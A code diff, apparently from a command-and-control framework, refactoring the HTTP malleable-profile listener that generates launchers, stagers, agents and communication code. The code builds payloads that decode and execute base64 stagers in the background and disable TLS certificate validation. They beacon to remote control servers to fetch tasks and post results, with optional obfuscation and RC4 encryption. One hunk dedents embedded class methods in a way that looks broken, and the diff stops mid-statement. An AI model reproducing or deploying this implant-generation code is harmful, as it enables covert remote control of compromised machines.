@@ -441,18 +441,14 @@ class Listener:
                     launcherBase,
                     obfuscation_command=obfuscation_command,
                 )
-                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                    launcherBase
-                )
 
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(launcherBase, launcher)
-            else:
-                return launcherBase
+            return launcherBase
 
-        elif language in ["python", "ironpython"]:
+        if language in ["python", "ironpython"]:
             # ==== HANDLE IMPORTS ====
             launcherBase = "import sys,base64\n"
             launcherBase += "import urllib.request,urllib.parse\n"
@@ -466,7 +462,7 @@ class Listener:
             if safeChecks and safeChecks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
-            launcherBase += "server='%s'\n" % (host)
+            launcherBase += f"server='{host}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -523,10 +519,7 @@ class Listener:
 
             # ==== BUILD REQUEST ====
             launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-            launcherBase += "req=vreq('{}', {})\n".format(
-                profile.stager.client.url,
-                profile.stager.client.body,
-            )
+            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
             launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
 
             # ==== ADD HEADERS ====
@@ -542,10 +535,7 @@ class Listener:
                 == malleable.Terminator.HEADER
             ):
                 launcherBase += "head=res.info().dict\n"
-                launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
-                    profile.stager.server.output.terminator.arg,
-                    profile.stager.server.output.terminator.arg,
-                )
+                launcherBase += f"a=head['{profile.stager.server.output.terminator.arg}'] if '{profile.stager.server.output.terminator.arg}' in head else ''\n"
                 launcherBase += "a=urllib.parse.unquote(a)\n"
             elif (
                 profile.stager.server.output.terminator.type
@@ -561,9 +551,6 @@ class Listener:
             launcherBase += listener_util.python_extract_stager(stagingKey)
 
             if obfuscate:
-                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                    launcherBase
-                )
                 launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                     launcherBase
                 )
@@ -574,18 +561,13 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = (
-                    "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
-                return launcher
-            else:
-                return launcherBase
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
+            return launcherBase
 
-        else:
-            log.error(
-                "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
-            )
+        log.error(
+            "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -644,9 +626,6 @@ class Listener:
             }
             stager = template.render(template_options)
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -675,19 +654,17 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey, stager.encode("UTF-8")
                 )
-            else:
-                return stager
+            return stager
 
-        elif language.lower() == "python":
+        if language.lower() == "python":
             comms_code = self.generate_comms(
                 listenerOptions=listenerOptions, language=language
             )
@@ -715,23 +692,19 @@ class Listener:
 
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return base64.b64encode(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                 )
-            else:
-                return stager
+            return stager
 
-        else:
-            log.error(
-                "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
-
+        log.error(
+            "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
         return None
 
     def generate_agent(
@@ -793,11 +766,10 @@ class Listener:
                     code,
                     obfuscation_command=obfuscation_command,
                 )
-                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
 
-        elif language == "python":
+        if language == "python":
             # read in the agent base
             if version == "ironpython":
                 f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
@@ -823,13 +795,13 @@ class Listener:
 
             if obfuscate:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
-                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
-        else:
-            log.error(
-                "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
+
+        log.error(
+            "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -848,122 +820,119 @@ class Listener:
         profile.post.client.host = host
         profile.post.client.port = port
 
-        if language:
-            if language.lower() == "powershell":
-                # PowerShell
-                updateServers = f'$Script:ControlServers = @("{ host }");'
-                updateServers += "$Script:ServerIndex = 0;"
+        if not language:
+            log.error("listeners/template generate_comms(): no language specified!")
+            return None
 
-                # ==== HANDLE SSL ====
-                if host.startswith("https"):
-                    updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+        if language.lower() == "powershell":
+            # PowerShell
+            updateServers = f'$Script:ControlServers = @("{ host }");'
+            updateServers += "$Script:ServerIndex = 0;"
 
-                getTask = f"""
+            # ==== HANDLE SSL ====
+            if host.startswith("https"):
+                updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+
+            getTask = f"""
 # ==== DEFINE GET ====
 $script:GetTask = {{
-    try {{
-        if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
-            # ==== BUILD ROUTING PACKET ====
-            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
-            $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
-            { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
+try {{
+    if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
+        # ==== BUILD ROUTING PACKET ====
+        $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
+        $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
+        { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
 
-            # ==== BUILD REQUEST ====
-            $vWc = New-Object System.Net.WebClient;
-            $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if ($Script:Proxy) {{
-                $vWc.Proxy = $Script:Proxy;
-            }}
+        # ==== BUILD REQUEST ====
+        $vWc = New-Object System.Net.WebClient;
+        $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+        $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+        if ($Script:Proxy) {{
+            $vWc.Proxy = $Script:Proxy;
+        }}
 """
 
-                # ==== CHOOSE URI ====
-                getTask += (
-                    "$taskURI = "
-                    + ",".join(
-                        [
-                            "'%s'" % u
-                            for u in (
-                                profile.get.client.uris
-                                if profile.get.client.uris
-                                else ["/"]
-                            )
-                        ]
-                    )
-                    + " | Get-Random;"
+            # ==== CHOOSE URI ====
+            getTask += (
+                "$taskURI = "
+                + ",".join(
+                    [
+                        f"'{u}'"
+                        for u in (
+                            profile.get.client.uris
+                            if profile.get.client.uris
+                            else ["/"]
+                        )
+                    ]
                 )
+                + " | Get-Random;"
+            )
 
-                # ==== ADD PARAMETERS ====
-                first = True
-                for parameter, value in profile.get.client.parameters.items():
-                    getTask += "$taskURI += '" + ("?" if first else "&") + "';"
-                    first = False
-                    getTask += f"$taskURI += '{ parameter }={ value }';"
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.PARAMETER
-                ):
-                    getTask += "$taskURI += '" + ("?" if first else "&") + "';"
-                    first = False
-                    getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.arg }=' + $RoutingPacket;"
+            # ==== ADD PARAMETERS ====
+            first = True
+            for parameter, value in profile.get.client.parameters.items():
+                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
+                first = False
+                getTask += f"$taskURI += '{ parameter }={ value }';"
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.PARAMETER
+            ):
+                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
+                first = False
+                getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.arg }=' + $RoutingPacket;"
 
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.URIAPPEND
-                ):
-                    getTask += "$taskURI += $RoutingPacket;"
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.URIAPPEND
+            ):
+                getTask += "$taskURI += $RoutingPacket;"
 
-                # ==== ADD HEADERS ====
-                for header, value in profile.get.client.headers.items():
-                    getTask += f"$vWc.Headers.Add('{ header }', '{ value }');"
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    getTask += f"$vWc.Headers.Add('{ profile.get.client.metadata.terminator.arg }', $RoutingPacket);"
+            # ==== ADD HEADERS ====
+            for header, value in profile.get.client.headers.items():
+                getTask += f"$vWc.Headers.Add('{ header }', '{ value }');"
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                getTask += f"$vWc.Headers.Add('{ profile.get.client.metadata.terminator.arg }', $RoutingPacket);"
 
-                # ==== ADD BODY ====
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    getTask += "$body = $RoutingPacket;"
-                else:
-                    getTask += f"$body = '{ profile.get.client.body }';"
+            # ==== ADD BODY ====
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                getTask += "$body = $RoutingPacket;"
+            else:
+                getTask += f"$body = '{ profile.get.client.body }';"
 
-                # ==== SEND REQUEST ====
-                if (
-                    profile.get.client.verb.lower() != "get"
-                    or profile.get.client.body
-                    or profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.get.client.verb }', [System.Text.Encoding]::Default.GetBytes('{ profile.get.client.body }'));"
-                else:
-                    getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
+            # ==== SEND REQUEST ====
+            if (
+                profile.get.client.verb.lower() != "get"
+                or profile.get.client.body
+                or profile.get.client.metadata.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.get.client.verb }', [System.Text.Encoding]::Default.GetBytes('{ profile.get.client.body }'));"
+            else:
+                getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
-                # ==== EXTRACT RESULTS ====
-                if (
-                    profile.get.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    getTask += f"$data = $vWc.responseHeaders.get('{ profile.get.server.output.terminator.arg }');"
-                    getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"
+            # ==== EXTRACT RESULTS ====
+            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
+                getTask += f"$data = $vWc.responseHeaders.get('{ profile.get.server.output.terminator.arg }');"
+                getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"
 
-                elif (
-                    profile.get.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    getTask += "$data = $result;"
-                    getTask += (
-                        "$data = [System.Text.Encoding]::Default.GetString($data);"
-                    )
+            elif (
+                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
+            ):
+                getTask += "$data = $result;"
+                getTask += "$data = [System.Text.Encoding]::Default.GetString($data);"
 
-                getTask += f"""
+            getTask += f"""
 # ==== INTERPRET RESULTS ====
 {profile.get.server.output.generate_powershell_r("$data")}
 
- # ==== RETURN RESULTS ====
+# ==== RETURN RESULTS ====
 $data = [System.Text.Encoding]::Default.GetBytes($data);
 $data;
 }}
@@ -978,8 +947,8 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 }};
 """
 
-                # ==== Send Message ====
-                sendMessage = f"""
+            # ==== Send Message ====
+            sendMessage = f"""
 # ==== DEFINE POST ====
 $script:SendMessage = {{
 param($Packets);
@@ -995,7 +964,7 @@ $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
 if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
 $vWc = New-Object System.Net.WebClient;
 
- # ==== CONFIGURE PROXY ====
+# ==== CONFIGURE PROXY ====
 $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
 $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
 if ($Script:Proxy) {{
@@ -1003,84 +972,81 @@ $vWc.Proxy = $Script:Proxy;
 }}
 """
 
-                # ==== CHOOSE URI ====
-                sendMessage += (
-                    "$taskURI = "
-                    + ",".join(
-                        [
-                            "'%s'" % u
-                            for u in (
-                                profile.post.client.uris
-                                if profile.post.client.uris
-                                else ["/"]
-                            )
-                        ]
-                    )
-                    + " | Get-Random;"
+            # ==== CHOOSE URI ====
+            sendMessage += (
+                "$taskURI = "
+                + ",".join(
+                    [
+                        f"'{u}'"
+                        for u in (
+                            profile.post.client.uris
+                            if profile.post.client.uris
+                            else ["/"]
+                        )
+                    ]
                 )
+                + " | Get-Random;"
+            )
 
-                # ==== ADD PARAMETERS ====
-                first = True
-                for parameter, value in profile.post.client.parameters.items():
-                    sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
-                    first = False
-                    sendMessage += f"$taskURI += '{ parameter }={ value }';"
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.PARAMETER
-                ):
-                    sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
-                    first = False
-                    sendMessage += f"$taskURI += '{ profile.post.client.output.terminator.arg }=' + $RoutingPacket;"
+            # ==== ADD PARAMETERS ====
+            first = True
+            for parameter, value in profile.post.client.parameters.items():
+                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
+                first = False
+                sendMessage += f"$taskURI += '{ parameter }={ value }';"
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.PARAMETER
+            ):
+                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
+                first = False
+                sendMessage += f"$taskURI += '{ profile.post.client.output.terminator.arg }=' + $RoutingPacket;"
 
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.URIAPPEND
-                ):
-                    sendMessage += "$taskURI += $RoutingPacket;"
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.URIAPPEND
+            ):
+                sendMessage += "$taskURI += $RoutingPacket;"
 
-                # ==== ADD HEADERS ====
-                for header, value in profile.post.client.headers.items():
-                    sendMessage += f"$vWc.Headers.Add('{ header }', '{ value }');"
+            # ==== ADD HEADERS ====
+            for header, value in profile.post.client.headers.items():
+                sendMessage += f"$vWc.Headers.Add('{ header }', '{ value }');"
 
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    sendMessage += f"$vWc.Headers.Add('{ profile.post.client.output.terminator.arg }', $RoutingPacket);"
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                sendMessage += f"$vWc.Headers.Add('{ profile.post.client.output.terminator.arg }', $RoutingPacket);"
 
-                # ==== ADD BODY ====
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    sendMessage += "$body = $RoutingPacket;"
-                else:
-                    sendMessage += f"$body = '{ profile.post.client.body }';"
+            # ==== ADD BODY ====
+            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
+                sendMessage += "$body = $RoutingPacket;"
+            else:
+                sendMessage += f"$body = '{ profile.post.client.body }';"
 
-                # ==== SEND REQUEST ====
-                sendMessage += "try {"
-                if (
-                    profile.post.client.verb.lower() != "get"
-                    or profile.post.client.body
-                    or profile.post.client.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.post.client.verb.upper() }', [System.Text.Encoding]::Default.GetBytes($body));"
-                else:
-                    sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
+            # ==== SEND REQUEST ====
+            sendMessage += "try {"
+            if (
+                profile.post.client.verb.lower() != "get"
+                or profile.post.client.body
+                or profile.post.client.output.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.post.client.verb.upper() }', [System.Text.Encoding]::Default.GetBytes($body));"
+            else:
+                sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
-                # ==== HANDLE ERROR ====
-                sendMessage += """
+            # ==== HANDLE ERROR ====
+            sendMessage += """
 } catch [System.Net.WebException] {
 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
 Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 }}}}};
 """
-                return updateServers + getTask + sendMessage
+            return updateServers + getTask + sendMessage
 
-            elif language.lower() == "python":
-                sendMessage = f"""
+        if language.lower() == "python":
+            sendMessage = f"""
 import base64
 import urllib
 import random
@@ -1088,282 +1054,251 @@ import sys
 
 
 class ExtendedPacketHandler(PacketHandler):
-    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
-        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
-        self.headers = headers
-        self.taskURIs = taskURIs
-        self.server = server
+def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
+    super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
+    self.headers = headers
+    self.taskURIs = taskURIs
+    self.server = server
 
-    def post_message(self, uri, data):
-        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
+def post_message(self, uri, data):
+    return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
 
-    def send_results_for_child(self, received_data):
-        self.headers['Cookie'] = "session=%s" % (received_data[1:])
-        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-        requestUri = self.server + taskURI
-        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
-        return response
+def send_results_for_child(self, received_data):
+    self.headers['Cookie'] = "session=%s" % (received_data[1:])
+    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+    requestUri = self.server + taskURI
+    response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
+    return response
 
-    def send_get_tasking_for_child(self, received_data):
-        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-        requestUri = self.server + taskURI
-        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
-        return response
+def send_get_tasking_for_child(self, received_data):
+    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+    requestUri = self.server + taskURI
+    response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
+    return response
 
-    def send_staging_for_child(self, received_data, hop_name):
-        postURI = self.server + "/login/process.php"
-        self.headers['Hop-Name'] = hop_name
-        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
-        return response
+def send_staging_for_child(self, received_data, hop_name):
+    postURI = self.server + "/login/process.php"
+    self.headers['Hop-Name'] = hop_name
+    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+    response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
+    return response
 """
-                sendMessage += "    def send_message(self, packets=None):\n"
-                sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+            sendMessage += "    def send_message(self, packets=None):\n"
+            sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
 
-                # ==== BUILD POST ====
-                sendMessage += "        if packets:\n"
+            # ==== BUILD POST ====
+            sendMessage += "        if packets:\n"
 
-                # ==== BUILD ROUTING PACKET ====
-                sendMessage += (
-                    "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
+            # ==== BUILD ROUTING PACKET ====
+            sendMessage += (
+                "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
+            )
+            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
+            sendMessage += (
+                "\n".join(
+                    [
+                        "            " + _
+                        for _ in profile.post.client.output.generate_python(
+                            "routingPacket"
+                        ).split("\n")
+                    ]
                 )
-                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
+                + "\n"
+            )
+
+            # ==== CHOOSE URI ====
+            sendMessage += (
+                "            taskUri = random.sample("
+                + str(profile.post.client.uris)
+                + ", 1)[0]\n"
+            )
+            sendMessage += "            requestUri = self.server + taskUri\n"
+
+            # ==== ADD PARAMETERS ====
+            sendMessage += "            parameters = {}\n"
+            for parameter, value in profile.post.client.parameters.items():
                 sendMessage += (
-                    "\n".join(
-                        [
-                            "            " + _
-                            for _ in profile.post.client.output.generate_python(
-                                "routingPacket"
-                            ).split("\n")
-                        ]
-                    )
-                    + "\n"
+                    "            parameters['" + parameter + "'] = '" + value + "'\n"
                 )
-
-                # ==== CHOOSE URI ====
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.PARAMETER
+            ):
                 sendMessage += (
-                    "            taskUri = random.sample("
-                    + str(profile.post.client.uris)
-                    + ", 1)[0]\n"
+                    "            parameters['"
+                    + profile.post.client.output.terminator.arg
+                    + "'] = routingPacket;\n"
                 )
-                sendMessage += "            requestUri = self.server + taskUri\n"
+            sendMessage += "            if parameters:\n"
+            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
-                # ==== ADD PARAMETERS ====
-                sendMessage += "            parameters = {}\n"
-                for parameter, value in profile.post.client.parameters.items():
-                    sendMessage += (
-                        "            parameters['"
-                        + parameter
-                        + "'] = '"
-                        + value
-                        + "'\n"
-                    )
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.PARAMETER
-                ):
-                    sendMessage += (
-                        "            parameters['"
-                        + profile.post.client.output.terminator.arg
-                        + "'] = routingPacket;\n"
-                    )
-                sendMessage += "            if parameters:\n"
-                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.URIAPPEND
+            ):
+                sendMessage += "            requestUri += routingPacket\n"
 
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.URIAPPEND
-                ):
-                    sendMessage += "            requestUri += routingPacket\n"
-
-                # ==== ADD BODY ====
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    sendMessage += "            body = routingPacket\n"
-                else:
-                    sendMessage += (
-                        "            body = '" + profile.post.client.body + "'\n"
-                    )
-                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
-
-                # ==== BUILD REQUEST ====
-                sendMessage += "            req = vreq(requestUri, body)\n"
-                sendMessage += (
-                    "            req.verb = '" + profile.post.client.verb + "'\n"
-                )
-
-                # ==== ADD HEADERS ====
-                for header, value in profile.post.client.headers.items():
-                    sendMessage += (
-                        "            req.add_header('"
-                        + header
-                        + "', '"
-                        + value
-                        + "')\n"
-                    )
-                if (
-                    profile.post.client.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    sendMessage += (
-                        "            req.add_header('"
-                        + profile.post.client.output.terminator.arg
-                        + "', routingPacket)\n"
-                    )
-
-                # ==== BUILD GET ====
-                sendMessage += "        else:\n"
-
-                # ==== BUILD ROUTING PACKET
-                sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
-                sendMessage += (
-                    "\n".join(
-                        [
-                            "            " + _
-                            for _ in profile.get.client.metadata.generate_python(
-                                "routingPacket"
-                            ).split("\n")
-                        ]
-                    )
-                    + "\n"
-                )
-
-                # ==== CHOOSE URI ====
-                sendMessage += (
-                    "            taskUri = random.sample("
-                    + str(profile.get.client.uris)
-                    + ", 1)[0]\n"
-                )
-                sendMessage += "            requestUri = self.server + taskUri;\n"
-
-                # ==== ADD PARAMETERS ====
-                sendMessage += "            parameters = {}\n"
-                for parameter, value in profile.get.client.parameters.items():
-                    sendMessage += (
-                        "             parameters['"
-                        + parameter
-                        + "'] = '"
-                        + value
-                        + "'\n"
-                    )
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.PARAMETER
-                ):
-                    sendMessage += (
-                        "             parameters['"
-                        + profile.get.client.metadata.terminator.arg
-                        + "'] = routingPacket\n"
-                    )
-                sendMessage += "            if parameters:\n"
-                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
-
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.URIAPPEND
-                ):
-                    sendMessage += "                requestUri += routingPacket;\n"
-
-                # ==== ADD BODY ====
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    sendMessage += "                body = routingPacket\n"
-                else:
-                    sendMessage += (
-                        "            body = '" + profile.get.client.body + "'\n"
-                    )
-                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
-
-                # ==== BUILD REQUEST ====
-                sendMessage += "            req = vreq(requestUri, body)\n"
-                sendMessage += (
-                    "            req.verb = '" + profile.get.client.verb + "'\n"
-                )
-
-                # ==== ADD HEADERS ====
-                for header, value in profile.get.client.headers.items():
-                    sendMessage += (
-                        "            req.add_header('"
-                        + header
-                        + "', '"
-                        + value
-                        + "')\n"
-                    )
-                if (
-                    profile.get.client.metadata.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    sendMessage += (
-                        "            req.add_header('"
-                        + profile.get.client.metadata.terminator.arg
-                        + "', routingPacket)\n"
-                    )
-
-                # ==== SEND REQUEST ====
-                sendMessage += "        try:\n"
-                sendMessage += "            res = urllib.request.urlopen(req);\n"
-
-                # ==== EXTRACT RESPONSE ====
-                if (
-                    profile.get.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    header = profile.get.server.output.terminator.arg
-                    sendMessage += (
-                        "            data = res.info().dict['"
-                        + header
-                        + "'] if '"
-                        + header
-                        + "' in res.info().dict else ''\n"
-                    )
-                    sendMessage += "            data = urllib.parse.unquote(data)\n"
-                elif (
-                    profile.get.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    sendMessage += "            data = res.read()\n"
-
-                # ==== DECODE RESPONSE ====
-                sendMessage += (
-                    "\n".join(
-                        [
-                            "        " + _
-                            for _ in profile.get.server.output.generate_python_r(
-                                "data"
-                            ).split("\n")
-                        ]
-                    )
-                    + "\n"
-                )
-                # before return we encode to bytes, since in some transformations "join" produces str
-                sendMessage += "            if isinstance(data,str): data = data.encode('latin-1');\n"
-                sendMessage += "            return ('200', data)\n"
-
-                # ==== HANDLE ERROR ====
-                sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
-                sendMessage += "            self.missedCheckins += 1\n"
-                sendMessage += "            if HTTPError.code == 401:\n"
-                sendMessage += "                sys.exit(0)\n"
-                sendMessage += "            return (HTTPError.code, '')\n"
-                sendMessage += "        except urllib.request.URLError as URLError:\n"
-                sendMessage += "            self.missedCheckins += 1\n"
-                sendMessage += "            return (URLError.reason, '')\n"
-
-                sendMessage += "        return ('', '')\n"
-
-                return sendMessage
-
+            # ==== ADD BODY ====
+            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
+                sendMessage += "            body = routingPacket\n"
             else:
-                log.error(
-                    "listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
+                sendMessage += "            body = '" + profile.post.client.body + "'\n"
+            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
+
+            # ==== BUILD REQUEST ====
+            sendMessage += "            req = vreq(requestUri, body)\n"
+            sendMessage += "            req.verb = '" + profile.post.client.verb + "'\n"
+
+            # ==== ADD HEADERS ====
+            for header, value in profile.post.client.headers.items():
+                sendMessage += (
+                    "            req.add_header('" + header + "', '" + value + "')\n"
                 )
-        else:
-            log.error("listeners/template generate_comms(): no language specified!")
+            if (
+                profile.post.client.output.terminator.type
+                == malleable.Terminator.HEADER
